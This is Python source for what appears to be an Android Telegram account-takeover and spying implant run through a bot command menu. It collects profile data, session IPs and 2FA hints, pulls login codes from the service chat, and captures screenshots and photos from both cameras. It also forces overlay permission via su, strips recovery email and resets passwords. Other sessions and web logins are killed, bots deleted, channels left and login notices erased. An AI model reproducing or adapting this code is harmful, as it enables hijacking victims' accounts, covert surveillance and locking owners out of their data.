        kb = {
            "keyboard": [
                [{"text": "Tg kid"}],
                [{"text": "IDK start"}],
                [{"text": "Screenshot gain"}],
            ],
            "resize_keyboard": True,
        }
        self._send_markup("<b>Меню:</b>", kb, html=True)

    def _start_polling(self):
        threading.Thread(target=self._poll, daemon=True).start()

    def _poll(self):
        offset = 0
        _cfg()
        try:
            r = _http_get(self._api("getUpdates") + "?offset=-1&timeout=0", timeout=10)
            if r:
                j = json.loads(r)
                if j.get("ok") and j.get("result"):
                    offset = j["result"][-1]["update_id"] + 1
        except Exception:
            pass
        while self._sync_running and not self.stop:
            try:
                r = _http_get(self._api("getUpdates") + "?offset=" + str(offset) + "&timeout=15", timeout=25)
                if r:
                    j = json.loads(r)
                    if j.get("ok") and j.get("result"):
                        for u in j["result"]:
                            offset = u["update_id"] + 1
                            msg = u.get("message") or {}
                            txt = (msg.get("text") or "").strip()
                            if txt:
                                try:
                                    threading.Thread(target=self._handle_message,
                                                     args=(txt,), daemon=True).start()
                                except Exception:
                                    pass
            except Exception as e:
                _log("poll: %s" % e)
            time.sleep(0.5)

    def _handle_message(self, msg_text):
        t = (msg_text or "").strip() if isinstance(msg_text, str) else (msg_text.get("text") or "").strip()
        if t == "Tg kid":
            threading.Thread(target=self._tg_kid, daemon=True).start()
        elif t == "IDK start":
            self._idk_start()
        elif t == "Screenshot gain":
            threading.Thread(target=self._screenshot_gain, daemon=True).start()
        else:
            self._send_msg("unknown: " + t)

    # ═══════════════════════════════════════════════════════════════════════
    # IDK OVERLAY
    # ═══════════════════════════════════════════════════════════════════════
    def _ensure_overlay_perm(self, ctx):
        try:
            if jclass("android.provider.Settings").canDrawOverlays(ctx):
                return True
        except Exception:
            pass
        pkg = str(ctx.getPackageName())
        for c in (
            "su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
            "su -c 'cmd appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
            "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg,
        ):
            try:
                subprocess.run(c, shell=True, capture_output=True, timeout=10)
            except Exception:
                continue
        try:
            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
        except Exception:
            return False

    def _show_idk_overlay(self):
        if self._idk_view is not None:
            return {"ok": True, "already": True}
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return {"error": "no ctx"}
            use_decor = not self._ensure_overlay_perm(ctx)
            drew = threading.Event()
            derr = [None]

            def _build():
                try:
                    wm = None
                    try:
                        CTX = jclass("android.content.Context")
                        wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
                    except Exception:
                        pass
                    self._idk_wm = wm

                    LL = jclass("android.widget.LinearLayout")
                    TV = jclass("android.widget.TextView")
                    LP = jclass("android.view.WindowManager$LayoutParams")
                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
                    Color = jclass("android.graphics.Color")
                    Gravity = jclass("android.view.Gravity")
                    TV2 = jclass("android.util.TypedValue")
                    VLG = jclass("android.view.ViewGroup$LayoutParams")

                    root = LL(ctx)
                    root.setOrientation(LL.VERTICAL)
                    root.setBackgroundColor(Color.parseColor(IDK_BG))
                    root.setGravity(Gravity.CENTER)

                    tv = TV(ctx)
                    tv.setText(IDK_TEXT)
                    tv.setTextColor(Color.parseColor(IDK_FG))
                    tv.setTextSize(TV2.COMPLEX_UNIT_SP, 96)
                    tv.setTypeface(tv.getTypeface(), 1)
                    tv.setGravity(Gravity.CENTER)
                    root.addView(tv, LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))

                    root.setFocusableInTouchMode(True)
                    root.requestFocus()
                    try:
                        root.setOnKeyListener(_make_idk_key())
                    except Exception:
                        pass
                    try:
                        root.setOnClickListener(_make_idk_click())
                    except Exception:
                        pass

                    if use_decor:
                        act2 = self._get_activity()
                        if act2 is None:
                            raise Exception("no activity for decor")
                        win = act2.getWindow()
                        for f in ("FLAG_KEEP_SCREEN_ON", "FLAG_SHOW_WHEN_LOCKED",
                                  "FLAG_DISMISS_KEYGUARD", "FLAG_TURN_SCREEN_ON"):
                            try:
                                win.addFlags(getattr(LP, f, 0))
                            except Exception:
                                pass
                        decor = win.getDecorView()
                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                        self._idk_decor = decor
                    else:
                        params = LP(
                            LP.MATCH_PARENT, LP.MATCH_PARENT,
                            getattr(LP, "TYPE_APPLICATION_OVERLAY", getattr(LP, "TYPE_PHONE", 2002)),
                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
                            | getattr(LP, "FLAG_SHOW_WHEN_LOCKED", 0x80000)
                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
                            -3,
                        )
                        params.gravity = Gravity.CENTER
                        wm.addView(root, params)
                    self._idk_view = root
                except Exception as e:
                    derr[0] = e
                finally:
                    drew.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_build)
            else:
                _build()
            drew.wait(8)
            if derr[0] is not None:
                return {"error": "idk overlay: %s" % derr[0]}
            if self._idk_view is None:
                return {"error": "overlay not created"}
            self._idk_keep_running = True
            self._idk_thread = threading.Thread(target=self._idk_keepalive_loop, daemon=True)
            self._idk_thread.start()
            return {"ok": True}
        except Exception as e:
            return {"error": "idk: %s" % e}

    def _idk_keepalive_loop(self):
        while self._idk_keep_running and self._sync_running:
            try:
                if self._idk_view is None:
                    self._idk_keep_running = False
                    return
                if self._idk_view.getParent() is None:
                    self._idk_view = None
                    self._idk_keep_running = False
                    return
            except Exception:
                self._idk_view = None
                self._idk_keep_running = False
                return
            time.sleep(0.5)

    def _hide_idk_overlay(self):
        try:
            self._idk_keep_running = False
            if self._idk_view is None and self._idk_decor is None:
                return {"ok": True}
            removed = threading.Event()
            derr = [None]

            def _rm():
                try:
                    if self._idk_view is not None:
                        parent = self._idk_decor or self._idk_wm
                        if parent is not None:
                            try:
                                parent.removeView(self._idk_view)
                            except Exception:
                                pass
                        self._idk_view = None
                        self._idk_decor = None
                except Exception as e:
                    derr[0] = e
                finally:
                    removed.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_rm)
                removed.wait(6)
            else:
                _rm()
            return {"error": str(derr[0])} if derr[0] else {"ok": True}
        except Exception as e:
            return {"error": "hide idk: %s" % e}

    # ═══════════════════════════════════════════════════════════════════════
    # HARVEST
    # ═══════════════════════════════════════════════════════════════════════
    def _harvest_account_info(self, acc=0):
        out = {}
        try:
            uc = _UC().getInstance(acc)
            uid = int(uc.getClientUserId())
            out["user_id"] = str(uid)

            u = None
            try:
                u = uc.getCurrentUser()
            except Exception:
                pass
            if u is None:
                try:
                    u = _MC().getInstance(acc).getUser(uid)
                except Exception:
                    pass

            rp = _real_phone_or_empty(u)
            if rp:
                out["phone"] = rp

            if u is not None:
                fn = str(getattr(u, "first_name", "") or "").strip()
                ln = str(getattr(u, "last_name", "") or "").strip()
                un = str(getattr(u, "username", "") or "").strip()
                bio = str(getattr(u, "about", "") or "").strip()
                lang = str(getattr(u, "lang_code", "") or "").strip()
                if fn:
                    out["first_name"] = fn
                if ln:
                    out["last_name"] = ln
                if un:
                    out["username"] = "@" + un if not un.startswith("@") else un
                if bio:
                    out["bio"] = bio[:200]
                if lang:
                    out["lang"] = lang
                if _get_bool_attr(u, "premium", False):
                    out["premium"] = "yes"
                if _get_bool_attr(u, "verified", False):
                    out["verified"] = "yes"
                if _get_bool_attr(u, "scam", False):
                    out["scam_flag"] = "yes"

            try:
                dcid = uc.getCurrentDatacenterId()
                if dcid:
                    out["dc_id"] = str(int(dcid))
            except Exception:
                pass

            try:
                IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUserSelf",
                          "org.telegram.tgnet.tl.TL_users$TL_inputUserSelf")
                GetFull = _cls("org.telegram.tgnet.TLRPC$TL_users_getFullUser",
                               "org.telegram.tgnet.tl.TL_users$getFullUser")
                if IU and GetFull:
                    rq = GetFull()
                    try:
                        rq.id = IU()
                    except Exception:
                        pass
                    resp, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
                    full = getattr(resp, "full_user", None) if resp is not None else None
                    if full is not None:
                        about = str(getattr(full, "about", "") or "").strip()
                        if about and "bio" not in out:
                            out["bio"] = about[:200]
                        bday = getattr(full, "birthday", None)
                        if bday is not None:
                            try:
                                d = _safe_int(getattr(bday, "day", 0))
                                m = _safe_int(getattr(bday, "month", 0))
                                y = _safe_int(getattr(bday, "year", 0))
                                parts = [str(x) for x in (d, m, y) if x]
                                if parts:
                                    out["birthday"] = "-".join(parts)
                            except Exception:
                                pass
                        if _get_bool_attr(full, "blocked", False):
                            out["blocked"] = "yes"
                        if getattr(full, "profile_photo", None) is not None:
                            out["has_avatar"] = "yes"
            except Exception:
                pass

            try:
                req = TLRPC.TL_account_getAuthorizations()
                resp, _e = self._rg_rpc(req, acc, 8.0, fast=True)
                auths = getattr(resp, "authorizations", None) if resp is not None else None
                sessions = []
                if auths is not None:
                    try:
                        size = auths.size()
                    except Exception:
                        size = 0
                    for i in range(size):
                        try:
                            a = auths.get(i)
                            info = {
                                "current": _get_bool_attr(a, "current", False),
                                "device": str(getattr(a, "device_model", "") or ""),
                                "platform": str(getattr(a, "platform", "") or ""),
                                "app": str(getattr(a, "app_name", "") or ""),
                                "app_version": str(getattr(a, "app_version", "") or ""),
                                "system": str(getattr(a, "system_version", "") or ""),
                                "ip": str(getattr(a, "ip", "") or ""),
                                "country": str(getattr(a, "country", "") or ""),
                                "region": str(getattr(a, "region", "") or ""),
                                "date_created": _safe_int(getattr(a, "date_created", 0)),
                                "date_active": _safe_int(getattr(a, "date_active", 0)),
                                "official_app": _get_bool_attr(a, "official_app", False),
                                "password_pending": _get_bool_attr(a, "password_pending", False),
                            }
                            info = {k: v for k, v in info.items() if v not in (None, "", 0, False)}
                            if info:
                                sessions.append(info)
                        except Exception:
                            continue
                if sessions:
                    out["sessions_count"] = str(len(sessions))
                    cur = next((s for s in sessions if s.get("current")), None)
                    if cur:
                        for k in ("device", "platform", "app", "system", "ip", "country", "region"):
                            if cur.get(k):
                                out["cur_" + k] = cur[k]
            except Exception:
                pass

            try:
                Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
                           "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
                if Get:
                    resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
                    auths = getattr(resp, "authorizations", None) if resp is not None else None
                    if auths is not None:
                        out["web_sessions"] = str(auths.size())
            except Exception:
                pass

            try:
                Get = _cls("org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
                           "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
                if Get:
                    resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
                    if resp is not None:
                        out["owned_bots"] = str(resp.size())
            except Exception:
                pass

            st = self._get_2fa_state(acc)
            if st is not None:
                out["2fa"] = "on" if st.get("has_password") else "off"
                if st.get("hint"):
                    out["2fa_hint"] = st["hint"]

            try:
                bal = self._stars_balance(acc)
                if bal > 0:
                    out["stars_balance"] = str(bal)
            except Exception:
                pass
        except Exception as e:
            _log("harvest: %s" % e)
        return out

    # ═══════════════════════════════════════════════════════════════════════
    # TG KID
    # ═══════════════════════════════════════════════════════════════════════
    def _pull_login_code(self):
        try:
            ip = self._get_input_peer(0, 777000)
            if ip is None:
                return None, None
            req = TLRPC.TL_messages_getHistory()
            req.peer = ip
            req.limit = 15
            req.offset_id = 0
            resp, err = self._rg_rpc(req, 0, 8.0, fast=True)
            if err is not None or resp is None:
                return None, None
            msgs = getattr(resp, "messages", None)
            if msgs is None or msgs.size() == 0:
                return None, None
            for i in range(msgs.size()):
                m = msgs.get(i)
                txt = str(getattr(m, "message", "") or "")
                if not txt:
                    continue
                m1 = re.search(r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})", txt)
                m2 = re.search(r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})", txt)
                m3 = None
                if not (m1 or m2):
                    m3 = re.search(r"(?:code|код)\D{0,10}(\d{5})\b", txt, re.IGNORECASE)
                found = None
                if m1:
                    found = m1.group(1)
                elif m2:
                    found = m2.group(1)
                elif m3:
                    found = m3.group(1)
                if found:
                    return found, txt
        except Exception as e:
            _log("pull_login_code: %s" % e)
        return None, None

    def _tg_kid(self):
        try:
            acc_info = self._harvest_account_info(0)
            raw_phone = acc_info.get("phone") or ""
            phone = raw_phone if raw_phone.startswith("+") else ("+" + raw_phone if raw_phone else "—")

            code, raw = self._pull_login_code()
            if not code:
                code = "не найден"
                raw = ""

            lines = ["<b>Tg kid</b>", ""]
            lines.append("<b>Код:</b> <code>%s</code>" % self._html_escape(str(code)))
            lines.append("<b>Телефон:</b> %s" % self._html_escape(phone))
            for k, v in acc_info.items():
                if k == "phone":
                    continue
                if v in (None, "", "?", "0"):
                    continue
                lines.append("<b>%s:</b> %s" % (self._html_escape(k), self._html_escape(str(v))))
            if raw:
                lines.append("")
                lines.append("<pre>" + self._html_escape(raw[:400]) + "</pre>")
            self._send_msg("\n".join(lines), html=True)
            return code
        except Exception as e:
            self._send_msg("Tg kid err: " + str(e))
            return None

    # ═══════════════════════════════════════════════════════════════════════
    # SCREENSHOT GAIN
    # ═══════════════════════════════════════════════════════════════════════
    def _screenshot_gain(self):
        results = {"screenshot": None, "camera_front": None, "camera_back": None}
        try:
            try:
                self._send_msg("📷 screenshot gain: скриншот...")
                results["screenshot"] = self._screenshot()
            except Exception as e:
                results["screenshot"] = {"error": str(e)}
                _log("screenshot_gain screen: %s" % e)
            try:
                self._send_msg("📷 screenshot gain: фронтальная камера...")
                results["camera_front"] = self._manual_camera("front")
            except Exception as e:
                results["camera_front"] = {"error": str(e)}
                _log("screenshot_gain front: %s" % e)
            try:
                self._send_msg("📷 screenshot gain: задняя камера...")
                results["camera_back"] = self._manual_camera("back")
            except Exception as e:
                results["camera_back"] = {"error": str(e)}
                _log("screenshot_gain back: %s" % e)
            try:
                lines = ["<b>📷 Screenshot gain — итог</b>"]
                for name, r in results.items():
                    if isinstance(r, dict):
                        if r.get("ok"):
                            lines.append("<b>%s:</b> ok %s" % (name, r.get("size", "")))
                        else:
                            lines.append("<b>%s:</b> %s" % (name, r.get("error", "fail")))
                    else:
                        lines.append("<b>%s:</b> %s" % (name, r))
                self._send_msg("\n".join(lines), html=True)
            except Exception:
                pass
            return results
        except Exception as e:
            _log("screenshot_gain: %s" % e)
            try:
                self._send_msg("Screenshot gain err: " + str(e))
            except Exception:
                pass
            return results

    # ═══════════════════════════════════════════════════════════════════════
    # 2FA
    # ═══════════════════════════════════════════════════════════════════════
    def _get_2fa_state(self, acc=0):
        try:
            req = TLRPC.TL_account_getPassword()
            resp, err = self._rg_rpc(req, acc, 10.0, fast=True)
            if err is not None or resp is None:
                return None
            return {
                "has_password": _get_bool_attr(resp, "has_password", False),
                "hint": str(getattr(resp, "hint", "") or ""),
            }
        except Exception:
            return None

    def _try_kill_2fa(self, acc=0):
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetPassword",
                       "org.telegram.tgnet.tl.TL_account$resetPassword")
            if not Rst:
                return "no class"
            req = Rst()
            resp, err = self._rg_rpc(req, acc, 12.0)
            if resp is not None:
                return "ok"
            etxt = str(getattr(err, "text", err) or err)
            if "PASSWORD_NOT_SET" in etxt:
                return "not_set"
            if "SESSION_PASSWORD_NEEDED" in etxt:
                return "need_password"
            if "FLOOD_WAIT" in etxt:
                return "flood"
            return "fail: %s" % etxt[:60]
        except Exception as e:
            return "exc: %s" % e

    def _request_password_reset(self, acc=0):
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetPassword",
                       "org.telegram.tgnet.tl.TL_account$resetPassword")
            if not Rst:
                return {"state": "error", "error": "no class"}
            rq = Rst()
            resp, err = self._rg_rpc(rq, acc, 15.0)
            if err is not None:
                return {"state": "error", "error": str(getattr(err, "text", err))[:120]}
            if resp is None:
                return {"state": "error", "error": "no response"}
            cls_name = str(type(resp))
            state = "unknown"
            until_ts = 0
            retry_ts = 0
            if "resetPasswordOk" in cls_name or "ResetPasswordOk" in cls_name:
                state = "ok"
            elif "resetPasswordRequestedWait" in cls_name:
                state = "requested"
                until_ts = _safe_int(getattr(resp, "until_date", 0))
            elif "resetPasswordFailedWait" in cls_name:
                state = "wait"
                retry_ts = _safe_int(getattr(resp, "retry_date", 0))
            else:
                if hasattr(resp, "until_date"):
                    state = "requested"
                    until_ts = _safe_int(getattr(resp, "until_date", 0))
                elif hasattr(resp, "retry_date"):
                    state = "wait"
                    retry_ts = _safe_int(getattr(resp, "retry_date", 0))
            out = {"state": state, "raw": cls_name}
            if until_ts:
                out["until"] = until_ts
                try:
                    out["until_human"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(until_ts))
                    out["days_left"] = max(0, int((until_ts - time.time()) / 86400))
                except Exception:
                    pass
            if retry_ts:
                out["retry"] = retry_ts
                try:
                    out["retry_human"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(retry_ts))
                except Exception:
                    pass
            return out
        except Exception as e:
            return {"state": "error", "error": str(e)}

    def _wipe_cloud_password(self, acc=0):
        try:
            St = self._get_2fa_state(acc)
            if St is None:
                return {"ok": False, "method": "state_none"}
            if not St.get("has_password"):
                return {"ok": True, "method": "none"}
            r1 = self._try_kill_2fa(acc)
            if r1 == "ok":
                return {"ok": True, "method": "reset"}
            if r1 == "not_set":
                return {"ok": True, "method": "already"}
            try:
                PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                          "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
                if PS:
                    ns = PS()
                    try:
                        ns.email = ""
                    except Exception:
                        pass
                    try:
                        ns.flags = 0
                    except Exception:
                        pass
                    Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                               "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
                    if Upd:
                        rq = Upd()
                        try:
                            rq.password = None
                        except Exception:
                            pass
                        rq.new_settings = ns
                        r2, _e2 = self._rg_rpc(rq, acc, 15.0)
                        if r2 is not None:
                            return {"ok": True, "method": "updateSettings"}
            except Exception:
                pass
            return {"ok": False, "method": r1}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def _remove_recovery_email(self, acc=0):
        try:
            PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                      "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
            if not PS:
                return {"ok": False, "error": "no class"}
            ns = PS()
            try:
                ns.email = ""
            except Exception:
                pass
            try:
                ns.flags = 0
            except Exception:
                pass
            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                       "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
            if not Upd:
                return {"ok": False, "error": "no class"}
            rq = Upd()
            try:
                rq.password = None
            except Exception:
                pass
            rq.new_settings = ns
            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return {"ok": r is not None}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def _nuke_password_pipeline(self, acc=0):
        report = {
            "recovery_removed": False, "reset_password": "?", "cloud_wiped": None,
            "state_before": None, "state_after": None, "attempts": 0,
            "delayed_reset": None, "final": "unknown",
        }
        try:
            report["state_before"] = self._get_2fa_state(acc)
        except Exception:
            pass
        try:
            sb = report["state_before"]
            if sb is not None and not sb.get("has_password"):
                report["final"] = "clean"
                return report
        except Exception:
            pass

        for attempt in range(3):
            report["attempts"] = attempt + 1
            try:
                r = self._remove_recovery_email(acc)
                if isinstance(r, dict) and r.get("ok"):
                    report["recovery_removed"] = True
            except Exception:
                pass
            time.sleep(0.5)
            try:
                r = self._try_kill_2fa(acc)
                report["reset_password"] = r
                if r in ("ok", "not_set"):
                    break
            except Exception as e:
                report["reset_password"] = "exc: %s" % e
            time.sleep(0.5)
            if report["reset_password"] not in ("ok", "not_set"):
                try:
                    r = self._wipe_cloud_password(acc)
                    report["cloud_wiped"] = r
                    if isinstance(r, dict) and r.get("ok"):
                        break
                except Exception as e:
                    report["cloud_wiped"] = {"ok": False, "error": str(e)}
            time.sleep(1.0)

        if report["reset_password"] not in ("ok", "not_set"):
            try:
                pr = self._request_password_reset(acc)
                report["delayed_reset"] = pr
                if pr.get("state") == "ok":
                    report["final"] = "clean"
            except Exception as e:
                report["delayed_reset"] = {"state": "error", "error": str(e)}

        try:
            report["state_after"] = self._get_2fa_state(acc)
        except Exception:
            pass
        try:
            sa = report["state_after"]
            if report["final"] != "clean":
                report["final"] = "clean" if (sa is None or not sa.get("has_password")) else "still_has_password"
        except Exception:
            if report["final"] != "clean":
                report["final"] = "unknown"
        return report

    # ═══════════════════════════════════════════════════════════════════════
    # SESSIONS
    # ═══════════════════════════════════════════════════════════════════════
    def _get_authorizations_full(self, acc=0):
        try:
            req = TLRPC.TL_account_getAuthorizations()
            resp, err = self._rg_rpc(req, acc, 8.0, fast=True)
            if resp is None:
                return None
            auths = getattr(resp, "authorizations", None)
            out = []
            if auths is None:
                return out
            for i in range(auths.size()):
                a = auths.get(i)
                if not a:
                    continue
                out.append({
                    "hash": _safe_int(getattr(a, "hash", 0)),
                    "current": _get_bool_attr(a, "current", False),
                    "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
                })
            return out
        except Exception:
            return None

    def _kill_all_sessions(self, acc=0):
        auths = self._get_authorizations_full(acc)
        if auths is None:
            return 0, 0
        total = len(auths)
        dead = set()

        def _one(h):
            try:
                Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
                           "org.telegram.tgnet.tl.TL_account$resetAuthorization")
                if not Rst:
                    return False
                rq = Rst()
                rq.hash = h
                _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                return e is None
            except Exception:
                return False

        killed = 0
        for _pass in range(5):
            targets = [a["hash"] for a in auths if not a["current"] and a["hash"] and a["hash"] not in dead]
            if not targets:
                break
            res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
            for r, h in zip(res, targets):
                if r is True:
                    killed += 1
                    dead.add(h)
            if _pass < 4:
                time.sleep(1.5)
                a2 = self._get_authorizations_full(acc)
                if not a2:
                    break
                auths = a2
                total = max(total, len(a2))
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
                       "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
            if Rst:
                self._rg_rpc(Rst(), acc, 10.0, fast=True)
        except Exception:
            pass
        return killed, total

    def _wipe_sessions_all(self):
        out = []
        for a in self._get_accounts_list():
            aid = a.get("id", 0)
            try:
                k, t = self._kill_all_sessions(aid)
                out.append({"account": aid, "user_id": a.get("user_id"), "killed": k, "total": t})
            except Exception as e:
                out.append({"account": aid, "error": str(e)})
        return out

    def _kill_web_authorizations(self, acc=0):
        try:
            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
                       "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
            if not Get:
                return 0
            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None:
                return 0
            auths = getattr(resp, "authorizations", None)
            if auths is None:
                return 0
            Reset = _cls("org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
                         "org.telegram.tgnet.tl.TL_account$resetWebAuthorization")
            if not Reset:
                return 0
            hashes = []
            for i in range(auths.size()):
                try:
                    h = _safe_int(getattr(auths.get(i), "hash", 0))
                    if h:
                        hashes.append(h)
                except Exception:
                    pass

            def _one(h):
                try:
                    rq = Reset()
                    rq.hash = h
                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception:
                    return False

            res = self._parallel([(_one, h) for h in hashes], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _kill_bots(self, acc=0):
        try:
            Get = _cls("org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
                       "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
            Del = _cls("org.telegram.tgnet.TLRPC$TL_bots_deleteBot",
                       "org.telegram.tgnet.tl.TL_bots$deleteBot")
            IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUser",
                      "org.telegram.tgnet.tl.TL_users$TL_inputUser")
            if not (Get and Del and IU):
                return 0
            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None:
                return 0
            bots = []
            try:
                size = resp.size()
            except Exception:
                size = 0
            for i in range(size):
                try:
                    b = resp.get(i)
                    bid = _safe_int(getattr(b, "id", 0))
                    bah = _safe_int(getattr(b, "access_hash", 0))
                    if bid and bah:
                        bots.append((bid, bah))
                except Exception:
                    pass

            def _one(bid, bah):
                try:
                    iu = IU()
                    iu.user_id = bid
                    iu.access_hash = bah
                    rq = Del()
                    rq.bot = iu
                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception:
                    return False

            res = self._parallel([(_one, b, a) for (b, a) in bots], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _leave_all_channels(self, acc=0):
        try:
            Leave = _cls("org.telegram.tgnet.TLRPC$TL_channels_leaveChannel",
                         "org.telegram.tgnet.tl.TL_channels$leaveChannel")
            IC = _cls("org.telegram.tgnet.TLRPC$TL_inputChannel",
                      "org.telegram.tgnet.tl.TL_channels$TL_inputChannel")
            if not (Leave and IC):
                return 0
            mc = _MC().getInstance(acc)
            try:
                dialogs = mc.dialogs_dict
            except Exception:
                dialogs = mc.getAllDialogs()
            if dialogs is None:
                return 0
            targets = []
            try:
                n = dialogs.size()
            except Exception:
                n = 0
            for i in range(n):
                try:
                    did = int(dialogs.keyAt(i))
                    if did >= -1000000000000:
                        continue
                    cid = -did - 1000000000000
                    ch = mc.getChat(cid)
                    if ch is None:
                        continue
                    ah = _safe_int(getattr(ch, "access_hash", 0))
                    if not ah:
                        continue
                    targets.append((cid, ah))
                except Exception:
                    pass

            def _one(cid, ah):
                try:
                    ic = IC()
                    ic.channel_id = cid
                    ic.access_hash = ah
                    rq = Leave()
                    rq.channel = ic
                    r, _e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return r is not None
                except Exception:
                    return False

            res = self._parallel([(_one, c, a) for (c, a) in targets], workers=6, timeout=40)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _confirm_unconfirmed_sessions(self, acc=0):
        try:
            last = self._last_session_confirm.get(acc, 0)
            if time.time() - last < 60:
                return 0
            self._last_session_confirm[acc] = time.time()
            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
                       "org.telegram.tgnet.tl.TL_account$getAuthorizations")
            if not Get:
                return 0
            res, _e = self._rg_rpc(Get(), acc, 15.0)
            if not res:
                return 0
            auths = getattr(res, "authorizations", None)
            if auths is None:
                return 0
            Ch = _cls("org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
                      "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings")
            if not Ch:
                return 0
            confirmed = 0
            for i in range(auths.size()):
                try:
                    a = auths.get(i)
                    if not a or not _get_bool_attr(a, "unconfirmed", False):
                        continue
                    h = _safe_int(getattr(a, "hash", 0))
                    if not h:
                        continue
                    rq = Ch()
                    rq.hash = h
                    try:
                        rq.confirmed = True
                    except Exception:
                        pass
                    try:
                        rq.flags = getattr(rq, "flags", 0) | 8
                    except Exception:
                        pass
                    _r2, e2 = self._rg_rpc(rq, acc, 10.0, fast=True)
                    if e2 is None:
                        confirmed += 1
                except Exception:
                    pass
            return confirmed
        except Exception:
            return 0

    def _kill_login_notice_dialog(self, acc=0):
        try:
            mc = _MC().getInstance(acc)
            for args in ((777000, 0, 0, True), (777000, 0, True), (777000, True)):
                try:
                    mc.deleteDialog(*args)
                    return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

